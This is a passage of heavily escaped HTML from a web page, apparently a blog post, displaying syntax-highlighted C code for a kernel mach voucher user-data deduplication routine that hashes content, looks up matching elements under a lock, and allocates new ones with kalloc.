class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t alloc &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sum &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_checksum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;USER_DATA_HASH_BUCKET&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;retry&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_iterate&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;],&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_hash &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* if sums match... */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_sum &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;sum &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* and all data matches */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;for&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;])&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;continue&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;kalloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_sum &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span 